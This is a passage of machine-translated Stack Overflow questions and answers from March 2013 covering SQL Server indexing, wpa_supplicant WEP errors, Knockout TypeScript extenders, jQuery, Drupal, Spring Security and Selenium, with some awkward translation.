void dispatcherTime_Tick(object sender, object e)
{
  //function, which needs to be invoked every two minutes.     
} 
```

# sql-server - 索引文档文件

> ID：15357739
> 
> 赞同：0
> 
> 时间：2013-03-12T09:40:33.377
> 
> 标签：sql-server, search, indexing

我想存储和索引 .doc、.pdf、.txt 等文档文件，然后通过基本的 Web 应用程序搜索这些文件并让用户下载它们。

我找到了两种方法。第一个是将这些文件存储在 MSSQL（文件流）中并使用全文搜索的功能进行搜索，但这种方式让我感到害怕，因为备份文件会越来越大。第二个是使用 Windows 搜索服务索引这些文件并使用远程查询搜索它们，但这种方式缺乏全文搜索能力。

最好的方法是什么，有没有更好的选择？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T11:58:55.663

您可以处理内置功能以进行全文搜索或构建自己的索引。我建议您自己构建一个作为文档搜索功能的[倒排索引。](http://en.wikipedia.org/wiki/Inverted_index)这里提出了一个非常相似的问题：[Building Big Search Egnine](https://dba.stackexchange.com/questions/17779/recommendations-for-building-a-big-search-engine/17793#17793)。希望它可以帮助您进一步设计您想要的东西。

# android - 我正在使用 wpa_supplicant。尝试连接受 WEP 保护的 AP 时如何知道密码错误？

> ID：15357744
> 
> 赞同：2
> 
> 时间：2013-03-12T09:40:41.253
> 
> 标签：android, wifi, wep

对于`WPA/WPA2`,`wpa_supplicant`可以在连接失败时给出错误密码的消息`HANDSHAKE procedure.`

但是当我尝试`WEP`使用错误的密码时，`wpa_supplicant`可以进入 COMPLETED 状态而不报告任何`error`.

我在互联网上搜索过，我得到的唯一有用的信息是有人说可以在无效的 crypt 字段`iwconfig`中提供未解密的数据包。`Rx`但是当我使用`WEP`并输入无效的密码字段时，我输入`iwconfig,`了0。`Rx`

我想知道那些手机如何判断WEP密码是否错误......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-29T07:04:05.520

WEP 网络可以分为两种类型：WEP-Open 和 WEP-Shared。在 802.11 标准中，设备首先向 AP 进行身份验证，然后再进行关联。最初的设计者打算有许多不同的身份验证方法来控制谁可以使用 AP。

在 1999 版标准中，定义了 2 种身份验证方法：开放和共享。在 Open 中，任何设备都可以向 AP 进行身份验证。在 Shared 中，只有具有 WEP 密钥的设备才能成功进行身份验证。

Authenticate 的问题在于，如果它处于建立连接的过程中，则任何更高级别的协议（如 802.1X）都不能在 Authenticate 802.11 帧内运行。所以 802.11i 不使用它，只是使用 Open Authenticate。

Shared Authenticate 有一个严重的缺陷，因为它是一个简单的质询/响应协议。这种设计对离线字典攻击非常开放。WEP 密钥很容易被泄露。此外，即使在开放式身份验证中，没有 WEP 密钥的设备也无法通过 AP 进行通信，因为 AP 会丢弃设备中的所有数据包。

# android - 非法资源引用：@*android 资源是私有的，并不总是存在

> ID：15357749
> 
> 赞同：1
> 
> 时间：2013-03-12T09:40:58.943
> 
> 标签：android, resources, styles, timepicker, numberpicker

```
<style name="mystyle" parent="@*android:style/Widget.Holo.NumberPicker">
</style> 
```

当我以我的风格使用它时，系统报告错误“非法资源引用：@*android 资源是私有的，并不总是存在”，这是什么问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T14:29:24.263

简单地说：这是不可能的。号码选择器没有公共样式。您可以通过简单搜索“style numberpicker”来找到这个 SO 问题/答案：[Unable to override style switchStyle and NumberPicker in Android](https://stackoverflow.com/questions/12201309/unable-to-override-style-switchstyle-and-numberpicker-in-android)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:47:09.097

遵循此代码：

```
if (value.startsWith("@*android:")) { //$NON-NLS-1$
    context.report(ISSUE, attribute, context.getLocation(attribute),
            "Illegal resource reference: @*android resources are private and " +
            "not always present", null);
} 
```

从您的节点中提取的字符串以`@*android`

那可能是你的问题

# knockout.js - 淘汰打字稿扩展器

> ID：15357750
> 
> 赞同：4
> 
> 时间：2013-03-12T09:40:59.570
> 
> 标签：knockout.js, typescript

任何人都可以发布一个在打字稿中扩展可观察到的示例吗？淘汰赛扩展器：http: [//knockoutjs.com/documentation/extenders.html](http://knockoutjs.com/documentation/extenders.html)

我从 3 月 6 日开始使用这个版本的 knockout.d.ts。2013 年 [https://github.com/borisyankov/DefinitelyTyped/tree/master/knockout](https://github.com/borisyankov/DefinitelyTyped/tree/master/knockout)

编辑：非常感谢！因此，要扩展您“只需”添加接口 KnockoutExtenders 以便打字稿将“允许”它。例子

```
interface KnockoutExtenders {
    logChange(target: any, option: string): KnockoutObservableAny;
}

ko.extenders.logChange = function (target, option) {
    target.subscribe(function (newValue) {
    console.log(option + ": " + newValue);
    });
return target;
}; 
```

在 viewmodel 内部声明如下：

```
this.score = ko.observable(score).extend({ logChange: "score" }); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T04:26:16.343

typescript 中的接口是开放式的，因此您可以在多个位置添加它们。

例如数字。您需要将此成员应用到扩展器以及您的 observables。这是示例：

```
interface KnockoutExtenders {
    numeric(target: any, precision: number): KnockoutObservableAny;
}
interface KnockoutObservableNumber {
    extend(data: any): KnockoutObservableNumber;
}
ko.extenders.numeric = function (target: KnockoutObservableNumber, digits) {
    var result = ko.computed({
        read: function () {
            var value = target();
            var toret: string = value.toString();
            if (toret.length < digits) {
                toret = "0" + toret;
            }
            else if (toret.length > digits) {
                toret = toret.substring(0, digits);
            }
            return toret;
        },
        write: target
    });

    result(target());
    return result;
}; 
```

您可以在此处查看完整示例：[https ://github.com/basarat/ChessClock/blob/d82a565ac9720cce00c75f099fcf7003f496755a/ChessClock/ChessClock/www/main.ts](https://github.com/basarat/ChessClock/blob/d82a565ac9720cce00c75f099fcf7003f496755a/ChessClock/ChessClock/www/main.ts)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T12:07:47.843

根据评论更新：在这种情况下，您只需将接口单独扩展为定义文件：

```
interface KnockoutExtenders {
    logChange: (target: KnockoutObservableAny, option: string) => KnockoutObservableAny;
} 
```

# vbscript - 如何实现 CloudPort 端逻辑？JScript 或 VBScript 产生一个 ActiveX 控件错误（即使是空的，具有空体函数）

> ID：15357753
> 
> 赞同：1
> 
> 时间：2013-03-12T09:41:24.933
> 
> 标签：vbscript, activex, jscript, single-threaded

我正在与之合作的团队购买了 CloudPort 许可证（来自 CrossCheck Networks），我们目前面临的问题是无法在服务 Mocks 中实现任何类型的逻辑（以控制响应选择）。这很简单：

```
if (requestCounter++ == 1)
    then 
        response = $fn:Global(MyFirstXmlString)$ // <-- this is CloudP syntax for vrbls
    else 
        response = $fn:Global(MySecondXmlString)$. 
```

我们没有找到任何使用 Dll 插件的示例，并且两个 JScript 和 VBScript 任务都没有工作（即，我们的客户端机器得到的不是期望的`MySecondXmlString`响应，而是一个错误

```
<faultstring>   
    ActiveX control '0e59f1d5-1fbe-11d0-8ff2-00a0d10038bc' cannot be instantiated 
    because the current thread is not in a single-threaded apartment.
</faultstring>. 
```

信不信由你，即使 J- 或 VB-Script 任务为空，也会出现上述故障！我们很难相信 CloudPort UI 中宣传的所有逻辑功能都是假的，*没有任何东西*可以帮助实现上述逻辑。

任何帮助，将不胜感激！

谢谢，庞皮

PS：这里有更多关于为什么需要上述逻辑的详细信息：我们在测试框架中使用 SoapSonar 来触发对 BizTalk 编排应用程序的请求。需要 CP 模拟来模拟该 BT 编排的环境。我们无法通过 SSonar 请求控制单个模拟响应：（对于 cloudport：传入）客户端请求是由生产代码发出的，并且不能由我们的 SSonar 客户端更改或控制）。唯一对我们有用的任务功能是一个 DB 表，作为离线通道使用 SSonar 和 CP（SSonar 写入其中，CP 从中读取）。CloudPort 从 DB 读取 responseXml 工作正常，但我们找不到在 CP 端实现进一步行为控制逻辑的方法。因此，这个stackoverflow发布。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T12:38:32.970

不要认为你可以从脚本中控制它。

线程模型应该由主机控制，我想它使用 Windows 的“vbscript.dll”进行实际执行。因此，如果您在工具选项或帮助中找不到任何设置:)，您应该在注册表项中查找该 ActiveX 或“vbscript.dll”的线程选项，即“ThreadingModel”值并尝试更改值（您还必须在网上搜索这些值，不知道它们）。

其他一些应用程序（防病毒软件？）可能会更改 COM 接口实际指向的 dll 的路径（请参阅[http://social.technet.microsoft.com/Forums/en-US/ieitpropriorver/thread/ ac10bd5f-6d91-4aac-857c-0ed5758088ec](http://social.technet.microsoft.com/Forums/en-US/ieitpropriorver/thread/ac10bd5f-6d91-4aac-857c-0ed5758088ec) )

希望能帮助到你。

# jquery - jquery：点击地址栏时，iphone 5 safari 上的 scrollTop 问题

> ID：15357763
> 
> 赞同：1
> 
> 时间：2013-03-12T09:41:53.873
> 
> 标签：jquery, iphone, html, web, safari

我有一个跨浏览器和跨平台的 webapp。在 iPhone 上，我设法使用 $(document).scrollTop(0); 隐藏地址栏；

下面是执行我想做的代码片段。

```
$(window).ready(function(){
$(window).scroll(function(){ /*detect scroll event*/
    setTimeout("ScrollWindowToTop();",0);
}); 
});
function ScrollWindowToTop(){
bodyelem=$("html,body"); /*i have tried this out with document,window, html, body*/
$(bodyelem).scrollTop(50);
} 
```

我需要它在以下情况下工作：1.当用户物理滚动页面时2.当页面当前处于另一个滚动位置时，当我点击状态栏使地址栏可见时，调用上述函数它隐藏了地址栏。

上述场景在 iPhone 4S 中完美实现。然而，第二种情况在 iPhone 5 中惨遭失败。

有谁知道可以在这里做什么？

编辑：我做了一些玩弄代码。在函数 ScrollWindowToTop() 中，我将其编辑如下

```
function ScrollWindowToTop(){
   document.body.scrollTop=50;
} 
```

但是，如果我在控制台中打印 document.body.scrollTop 的值，它会将值显示为 0。知道为什么 iPhone5 中的 Safari 不修改此属性的值吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T07:23:36.497

好的，所以我找到了一个肮脏的修复程序。

```
$('body').on('touchstart', function (e){
  if (!$('.activeScroll').has($(e.target)).length){ 
    ScrollWindowToTop();
   }
}); 
```

我的页面上只有几个可滚动元素，因此我在可滚动元素中添加了一个名为“ **activeScroll** ”的类。如果在任何不可滚动的元素上检测到“ **touchstart** ”，它将强制页面向上滚动。因此，如果地址栏决定是讨厌的顽固自我而不是隐藏，页面上任何地方的触摸事件都会强制它备份。进入厄运之地。

# linux - 从 perl 在 linux 中运行程序

> ID：15357764
> 
> 赞同：0
> 
> 时间：2013-03-12T09:41:55.917
> 
> 标签：linux, perl

我想通过使用系统命令（或任何其他方式）从 perl 运行程序。

系统（“samtools”）；

我认为它应该将它传递给 shell，但它抱怨，当我运行它时，不能执行“samtools”文件或目录不存在。我尝试了许多其他不同的程序，例如

系统（“天鹅绒”）；

它工作正常，但不是这个（samtools）。你们中有人遇到过这个问题吗？我真的很困惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:46:08.143

您可以提供该文件位置**的完整路径。**

例子：

```
system( "/usr/bin/perl -de 1"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:59:17.923

尝试将 Linux 命令放在 `` 字符中。也会起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T13:22:55.007

您是否在当前 shell 中手动修改`$path`了 for ？`samtools`

由于`system`启动了一个新的子 shell 来运行您的命令，`samtools`如果您的`.bashrc`. 通过以下方式检查：

```
perl -e 'system("echo \$PATH")' 
```

和

```
echo $PATH 
```

看看有没有什么不同。

# mysql - 现有列上的Mysql未知列（仅插入）

> ID：15357768
> 
> 赞同：3
> 
> 时间：2013-03-12T09:42:12.757
> 
> 标签：mysql, mysql-error-1054

我一直在研究这个问题很长一段时间，但未能找到任何有用的结果。

我有一张桌子：

```
CREATE TABLE `jobs` (
    `jb_id` MEDIUMINT(7) UNSIGNED NOT NULL AUTO_INCREMENT,
    `wo_id` MEDIUMINT(7) UNSIGNED NOT NULL,
    `file_name` VARCHAR(140) NOT NULL COLLATE 'latin1_bin',
    `jb_status` TINYINT(1) UNSIGNED NOT NULL DEFAULT '0',
    `descr` TEXT NULL COLLATE 'latin1_bin',
    `syncronized` TINYINT(2) UNSIGNED NOT NULL,
    `failedcnt` TINYINT(3) UNSIGNED NOT NULL,
    `clip_title` TINYTEXT NULL COLLATE 'latin1_bin',
    `clip_description` TEXT NULL COLLATE 'latin1_bin',
    `clip_tags` TINYTEXT NULL COLLATE 'latin1_bin',
    PRIMARY KEY (`jb_id`),
    INDEX `woid` (`wo_id`),
    INDEX `job_stat` (`jb_status`),
    INDEX `synced` (`syncronized`),
    INDEX `failedcnt` (`failedcnt`),
    INDEX `file_name` (`file_name`)
)
COLLATE='latin1_bin'
ENGINE=MyISAM; 
```

当我运行 SELECT 或 UPDATE 命令时，一切正常。

```
select jobs.clip_description from jobs Limit 1;
/* 0 rows affected, 1 rows found. Duration for 1 query: 0.768 sec. */

UPDATE `jobs` SET `clip_description`='test' WHERE  `jb_id`=2 LIMIT 1; 
```

但是当我尝试跑步时

```
INSERT INTO `jobs` (`clip_description`) VALUES ('test');
/* SQL Error (1054): Unknown column 'clip_description' in 'field list' */ 
```

这也发生在昨天，但由于当时我没有太多时间来处理这个问题，我创建了具有不同名称但结构相同的新表，复制了所有数据，然后重命名了两个表，它再次工作。直到大约两个小时前问题再次出现。每 12 小时开始应对桌子并不是一个真正的选择。

为了创建我使用的副本：

```
CREATE TABLE jobs_new LIKE jobs; INSERT jobs_new SELECT * FROM jobs; 
```

之后，前面提到的插入将起作用。

任何帮助将不胜感激。

编辑：如果有什么不同，我正在运行服务器版本：5.5.28-0ubuntu0.12.04.2-log (Ubuntu) On ubuntu server 12.04 LTS 64bit

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:56:47.987

看起来您还有其他与表相关的约束，可能是触发器或某些计算列，具体取决于 clip_description 列。是不是？

请使用此表检查依赖项和触发器。

# c# - 如何过滤过去 24 小时的 sqlite 记录？

> ID：15357772
> 
> 赞同：0
> 
> 时间：2013-03-12T09:42:24.530
> 
> 标签：c#, sqlite, windows-8, microsoft-metro

我正在开发一个使用 SQLite 的 Windows 商店应用程序。我想过滤过去 24 小时、48 小时和一周的记录。我在表中有一个日期时间字段，但是当我在下面提供查询时，它给出了一个异常。对象引用未设置为目的。我正在尝试过滤最后 24 小时。

```
var query = (db.Table<Table Name>().Where(c => c.DateField > 
                                          System.DateTime.Today.AddDays(-1))); 
```

这个怎么做？

# python - functools.wraps 和 update_wrapper 有什么区别

> ID：15357776
> 
> 赞同：26
> 
> 时间：2013-03-12T09:42:35.620
> 
> 标签：python

我无法找到这两个 python 函数之间的区别。

`functools.wraps` 和`update_wrapper`

有人可以给我一些代码示例，以便我了解有什么区别

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-12T10:00:00.060

`functools.wraps`相当于：

```
def wraps(wrapped, assigned=WRAPPER_ASSIGNMENTS, updated=WRAPPER_UPDATES):
    def decorator(wrapper):
        return update_wrapper(wrapper, wrapped=wrapped, ...)
    return decorator 
```

它实际上是使用`partial`而不是内部函数来实现的，但是效果是一样的。

目的是允许将其用作装饰器：

```
 @wraps(f)
 def g():
     ... 
```

相当于：

```
def g():
    ...
g = update_wrapper(g, f) 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-09-27T15:13:10.427

通常你只会使用*包装**update_wrapper* 的 wraps 。更多的：

*   *partial*函数 = 创建一个新函数，其中一些参数绑定到值

*   **用Wrapper**包裹*partials *update_wrapper* ，从而为*wrapper创建一个装饰器**

**   *update_wrapper* 's purpose is to copy certain attributes (not arguments) from *wrapped* to *wrapper*. On default these are:* 

 *```
WRAPPER_ASSIGNMENTS = ('__module__', '__name__', '__qualname__', '__doc__',
                       '__annotations__')
WRAPPER_UPDATES = ('__dict__',)

```

A useful example:

```
try:
    from itertools import izip_longest as zip_longest
except:
    from itertools import zip_longest
from collections import Iterable
from functools import wraps

def ziplongest(*args):
    '''zip_longest with last element as filler
    >>> args=([9],[2,3],1)
    >>> [t for t in ziplongest(*args)]
    [(9, 2, 1), (9, 3, 1)]

    '''
    iterable = lambda a:(a if isinstance(a,Iterable) else [a])
    _args = [iterable(a) for a in args]
    withnone = zip_longest(*_args)
    for e in withnone:
        yield tuple((en or _args[i][-1]) for i,en in enumerate(e))

def listable(f):
    '''apply f to list members
    >>> @listable
    ... def mul(a,b):
    ...     'returns a*b'
    ...     return a*b
    >>> mul(2,[3,9])
    [6, 18]
    >>> mul.__doc__
    'returns a*b'

    '''
    @wraps(f)#without this e.g __doc__ would get hidden
    def to_elems(*args,**kwargs):
        if any(isinstance(x,list) for x in args):
            return [f(*a,**kwargs) for a in ziplongest(*args)]
        else:
            return f(*args,**kwargs)
    return to_elems 
```*

# .htaccess - 试图将 Drupal 安装到子目录

> ID：15357777
> 
> 赞同：1
> 
> 时间：2013-03-12T09:42:39.430
> 
> 标签：.htaccess, drupal, relative-path, subdirectory, file-structure

好的，所以我到处搜索，虽然我可以找到很多关于将 Drupal 安装移出子目录的内容，但我找不到任何关于将其移入子目录的内容。我最近接手了这个项目，它是在没有我的情况下开发的，所以我在这里登陆。

问题是该站点是在开发服务器的根目录中开发的，现在我有人想要它在子目录中。我已经更改了 htaccess 中的基本 url，并尝试手动更改 CSS 和 DB 中的引用，但我不能确定我是否已经捕获了所有内容（模块等）。

我想知道的是，有没有办法强制相对于根的每个链接都相对于根/示例。基本上，曾经位于 www.example.com 的所有内容现在都位于 www.example.com/subdirectory。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T19:45:42.750

这有两个部分。您已经完成的第一件事：配置 htaccess 以设置包含子目录的基本 url。

不幸的是，您可能在节点内容（尤其是嵌入的图像）中有相当多的引用将停止工作。

一个相对简单的解决方案是在您的站点主题中包含 <base href="foo.com/dir" /> 标记，但从长远来看，这不是一个很好的解决方案。

您可以尝试通过以下查询直接修改数据库（小心使用，提前备份数据库等）：

UPDATE field_revision_body SET body_value = REPLACE(body_value, 'devdomain.com', 'proddomain.com/subdir') （将 http:// 添加到这些查询中）

您可能还需要更新文件表中的路径以反映磁盘上的新位置，尤其是在您使用多站点时。

或者，您是否考虑过使用[备份和迁移](http://drupal.org/project/backup_migrate)模块将内容从开发服务器移动到新实例的新安装？

# iphone - 关于 iPhone 中的消息访问配置文件 (MAP) 的问题

> ID：15357781
> 
> 赞同：0
> 
> 时间：2013-03-12T09:42:56.310
> 
> 标签：iphone, ios, bluetooth

我无法得到这些问题的答案：

1.  BT 设备能否通过 iPhone 中的消息访问配置文件 (MAP) 发送 SMS？
2.  彩信呢？BT 配件能否收到收到彩信的通知？可以发彩信吗？
3.  MAP 是否也适用于电子邮件收件箱，还是仅适用于 SMS？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T12:59:08.353

**已编辑**

SMS、iMessage 可以使用 MAP 配置文件传送。

您可以使用 SMS 和 iMessage 的推送通知，并可以使用 MAP 配置文件将这些消息发送到 BT 设备。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T03:50:05.510

MAP 使用 OBEX 协议进行消息传输 1\. 不确定 iPhone，但 MAP 要求设备之间的消息传输 2\. MAP 中的客户端和服务器都必须通知（服务器是电话，BT Acc'y 作为客户端）。手机需要根据 MA​​P 规范强制支持 SMS 和 MMS，因此可以将 MMS 通知发送到 BT 附件。这取决于 BT 附件是否发送 MMS 3.MAP 适用于所有消息类型 -​​ SMS、MMS 和电子邮件。电子邮件不是强制性的，因此取决于实施。

# jquery - 从 ajax 加载的表单提交

> ID：15357787
> 
> 赞同：1
> 
> 时间：2013-03-12T09:43:08.893
> 
> 标签：jquery, html

你好

有没有人提交 ajax 加载表单的想法：www.example.com/form.php 是

```
<form>
    <fieldset>
        <legend>Your name?</legend>
        <input type="name" id="name" />
        <button type="submit">OK!</button>
    </fieldset>
</form> 
```

和 www.example.com/index.php 是

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Myform</title>
        <script type="text/javascript" src="jquery.js"></script>
    </head>
    <body>
        <div id="formDiv"></div>
        <button id="open">Open</button>
        <button id="close">Close</button>
        <script type="text/javascript">
            (function($) {
                $(document).ready(function() {
                    $('#open').click(function() {
                        $('#formDiv').load('www.example.com/form.php');
                    });
                    $('#close').click(function() {
                        $('#formDiv').empty();
                    });
                    $('#formDiv form').submit(function() {
                        alert("Hello, "+($('#formDiv form #name').val())+"!");
                        return false;
                    });
                });
            })(jQuery);
        </script>
    </body>
</html> 
```

我希望提醒“你好，我的名字”而不是提交。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:47:38.127

使用[事件委托](http://api.jquery.com/on/#direct-and-delegated-events)为动态加载的表单设置事件处理程序：

```
$('#formDiv').on('submit', 'form', function(event) {
    alert("Hello, "+($('#name').val())+"!");
    return false;
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-12T09:47:24.567

您的表单提交事件将不起作用，因为当它被执行时，表单可能不会被加载相反，您应该在加载事件的回调中编写事件，如下所示

```
$('#formDiv').load('www.example.com/form.php',{},function() {
    $('#formDiv form').submit(function(event) {
        event.preventDefault();
        alert("Hello, "+($('#formDiv form #name').val())+"!");
    });
}); 
```

在这种情况下也返回 false；将不起作用，您需要使用 event.preventDefault()

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-12T09:46:33.137

您需要使用[jQuery.on使用事件委托](http://api.jquery.com/on/)

```
$('#formDiv').on('submit', 'form', function() {
    alert("Hello, "+($('#formDiv form #name').val())+"!");
    return false;
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:46:47.293

尝试

```
 $('#formDiv form').live('submit',function() {
           alert("Hello, "+($('#formDiv form #name').val())+"!");
           return false;
    }); 
```

# javascript - geocoder.geocode 仅在特定条件下工作

> ID：15357792
> 
> 赞同：2
> 
> 时间：2013-03-12T09:43:38.863
> 
> 标签：javascript, asp.net, google-geocoder

此代码仅适用于脚本块中活动的 2 个警报，如果您注释第一个或第二个警报，则地理编码功能不起作用。这是一个简单的 asp.net 页面，它尝试从地址获取纬度和经度，在本例中是硬编码：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Test.aspx.cs" Inherits="Test" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>
    <script type="text/javascript" src="/Global/js/jquery-1.8.3.min.js"></script>
</head>
<body>
    <form id="form1" runat="server">
        <div style="width: 100%">
            <div style="width: 50%; clear: left; float: left; text-align: right;">
                Latitudine:
            </div>
            <div style="width: 50%; float: left; text-align: left;">
                <asp:TextBox ID="TxbLatitudine" runat="server" Columns="20"  />
                <asp:Button ID="BtnFind" runat="server" Text="Cerca cordinate" OnClientClick="javascript: findLocation();" />
            </div>
        </div>
        <div style="width: 100%">
            <div style="width: 50%; clear: left; float: left; text-align: right;">
                Longitudine:
            </div>
            <div style="width: 30%; float: left; text-align: left;">
                <asp:TextBox ID="TxbLongitudine"  runat="server" Columns="20" ></asp:TextBox>
            </div>
        </div>
    </form>
    <script type="text/javascript">
        function findLocation() {
            var geocoder = new google.maps.Geocoder();

            alert("before");  //if you remove this doesn't work
            geocoder.geocode({ 'address': "Cagliari, Italy" }, function (results, status) {
                if (status == google.maps.GeocoderStatus.OK) {
                    $('#<%= TxbLatitudine.ClientID %>').val("a");
                } else {
                    $('#<%= TxbLongitudine.ClientID %>').val("not OK");
                }
            });
            alert("after");  //if you remove this doesn't work
        }
    </script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:16:52.497

我用 html 输入按钮替换了 asp:Button：

```
<input id="Button1" type="button" value="Find..." onclick="javascript: findLocation();" /> 
```

第一个导致页面回发干扰客户端脚本块功能。

# spring - 警告：可能的错误：过滤器都是 org.springframework.security.web.session.SessionManagementFilter 的实例

> ID：15357797
> 
> 赞同：1
> 
> 时间：2013-03-12T09:43:51.233
> 
> 标签：spring, security

我正在使用 Spring MVC 和 Spring security 开发一个 Web 应用程序。实际上我没有错误，而是警告。看起来这个警告很快就会出现错误:)

当我尝试部署我的应用程序时，它已成功部署，但出现警告：

“警告：可能的错误：位置 7 和 8 的过滤器都是 org.springframework.security.web.session.SessionManagementFilter 的实例”

我的 spring-security xml 中有 sessionManagementFilter 和 preAuthenticationFilter 。

我已经用谷歌搜索了这个问题，但似乎没有人得到同样的警告。这是什么警告？它会导致错误吗？我该如何解决？我无法解决问题，如果有人帮助我，我将不胜感激。谢谢你。

我的spring-security.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans:beans xmlns="http://www.springframework.org/schema/security" xmlns:beans="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.1.xsd http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-3.1.xsd">

    <http create-session="never" use-expressions="true" auto-config="false" entry-point-ref="preAuthenticatedProcessingFilterEntryPoint">
        <custom-filter ref="sessionManagementFilter" before="SESSION_MANAGEMENT_FILTER" />
        <intercept-url pattern="/restricted/**" access="isAuthenticated()" />
        <custom-filter position="PRE_AUTH_FILTER" ref="myPreAuthFilter" />
        <session-management>
            <concurrency-control max-sessions="1" error-if-maximum-exceeded="false" expired-url="/invalid-session.xhtml?concurrent=true" />
        </session-management>
        <logout logout-url="/cikis" invalidate-session="true" delete-cookies="JSESSIONID" success-handler-ref="myLogoutHandler" />
    </http>

    <beans:bean id="myLogoutHandler" class="com.test.MyLogoutHandler" />
    <beans:bean id="userDetailsServiceImpl" class="com.test.UserDetailsServiceImpl" />
    <beans:bean id="preAuthenticatedProcessingFilterEntryPoint" class="com.test.ForbiddenURLEntryPoint" />
    <beans:bean id="preAuthenticationProvider" class="org.springframework.security.web.authentication.preauth.PreAuthenticatedAuthenticationProvider">
        <beans:property name="preAuthenticatedUserDetailsService" ref="userDetailsServiceImpl" />
    </beans:bean>
    <beans:bean id="myPreAuthFilter" class="com.test.MyPreAuthenticationFilter">
        <beans:property name="authenticationManager" ref="appControlAuthenticationManager" />
    </beans:bean>
    <beans:bean id="sessionManagementFilter" class="org.springframework.security.web.session.SessionManagementFilter">
        <beans:constructor-arg name="securityContextRepository" ref="httpSessionSecurityContextRepository" />
        <beans:property name="invalidSessionStrategy" ref="jsfRedirectStrategy" />
    </beans:bean>
    <beans:bean id="jsfRedirectStrategy" class="com.test.JsfRedirectStrategy"/>
    <beans:bean id="httpSessionSecurityContextRepository" class="org.springframework.security.web.context.HttpSessionSecurityContextRepository"/>

    <authentication-manager alias="appControlAuthenticationManager">
        <authentication-provider ref="preAuthenticationProvider" />
    </authentication-manager>
</beans:beans> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-06T10:53:17.277

Spring security 在启动时默认包含 SessionManagementFilter。
如果你想指定你自己的 SESSION_MANAGEMENT_FILTER 你必须禁用 session-fixation-protection，只需输入：

```
<http create-session="never" use-expressions="true" auto-config="false" entry-point-ref="preAuthenticatedProcessingFilterEntryPoint">
        <session-management session-fixation-protection="none"/>
        <custom-filter ref="sessionManagementFilter" before="SESSION_MANAGEMENT_FILTER" />

        <...>
</http> 
```

# wcf - 应用程序未调用 WCF 服务（均托管在 IIS7 上）

> ID：15357798
> 
> 赞同：0
> 
> 时间：2013-03-12T09:43:52.613
> 
> 标签：wcf, service, iis-7

我在 IIS7 中托管了 WCF 服务和我的 ASP.Net MVC3 应用程序。两者都在同一台服务器中。应用程序位于默认应用程序池中，服务位于不同的应用程序池中。

在发布之前，我已将托管服务的服务引用添加到应用程序中。它在本地工作。但是当托管在 IIS7 上时，该应用程序不会调用服务。

关于为什么会发生这种情况以及或如何调试的任何指示？如果您需要任何其他详细信息，请告诉我。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T13:04:04.493

对于任何看到这个线程的人的未来参考，问题是我正在使用我的 javascript 中的 MVC3 和 ajax 调用，看起来像这样：

```
$.ajax({
    url: 'controller/action',
    type: 'GET',
    dataType: 'json',
    success: function(data) {
} 
```

但 url 不应该是“控制器/动作”，它应该存储在一个字符串变量中说

```
var callingVariable = "@Url.Action("Action","Controller")"; 
```

并且这个变量应该提供给 url 参数。

# python - python webdriver os 窗口

> ID：15357800
> 
> 赞同：0
> 
> 时间：2013-03-12T09:43:56.557
> 
> 标签：python, selenium-webdriver

我需要使用 Python 和 Selenium 上传文件。当我单击上传 HTML 元素时，会打开一个“文件上传”窗口，并且 click() 方法不会返回，因为它等待完全加载页面。因此我无法继续使用 pywinauto 代码来控制窗口。

第一种方法点击 HTML 元素（一个 img）来上传一个新文件：

```
def add_file(self):
    return self.selenium.find_element(By.ID, "add_file").click() 
```

第二种方法是使用 pywinauto 键入文件的路径，然后单击打开

```
def upload(self):
    from pywinauto import application
    app = application.Application()
    app.connect_(title_re = "File Upload")
    app.file_upload.TypeKeys("C:\\Path\\To\\FIle")
    app.file_upload.Open.Click() 
```

如何强制 add_file 方法返回并能够运行上传方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T14:50:03.457

解决这个问题。有一个 iframe 处理上传，但被隐藏并且一开始没有看到它。iframe 包含一个也隐藏的文件类型的输入。要解决它，使用 javascript 使 iframe 可见：

```
selenium.execute_script("document.getElementById('iframe_id').style.display = 'block';") 
```

然后切换到 iframe 并使输入也可见：

```
selenium.switch_to_frame(0)
selenium.execute_script("document.getElementById('input_field_id').type = 'visible';") 
```

并简单地将路径发送到输入：

```
